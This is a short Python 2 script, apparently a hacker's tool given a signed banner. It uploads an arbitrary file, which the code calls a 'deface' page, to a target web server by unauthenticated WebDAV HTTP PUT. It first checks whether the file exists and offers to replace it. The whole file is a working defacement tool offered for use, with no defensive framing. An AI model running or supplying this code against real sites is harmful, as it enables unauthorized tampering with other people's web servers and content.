#!/usr/bin/python

import requests
import string
import random
import sys
import os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

os.system("clear")

print(bcolors.FAIL + "Coded By Mr.R4SSOMypaBen")
print("github.com/r4sso")

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      deface = f.read()
  script = deface
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[*] Upload File Name : %s") % (sys.argv[2])
  print("[*] Uploading %d bytes, New Script") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("[!] Upload failed . . .")
    sys.exit(1)
  else:
    print("[+] File uploaded . . .")
    print("[+] PATH : "+host + nama)


def checkfile():
 print("[*] Checking file in target : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("[*] Same file has found . . .")
  question = raw_input("[!] Replace File Target ? [Y/N] > ")
  if question == "Y":
   webdav()
  else:
   print("[!] Exiting Tools . . .")
   sys.exit()
 else:
   print("[*] Same File Not Found In Your Target") 
   print("[*] Processing. . . . ")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] Usage: "+sys.argv[0]+" Target.com Script.html\n")
    sys.exit(0)
  else:
    checkfile()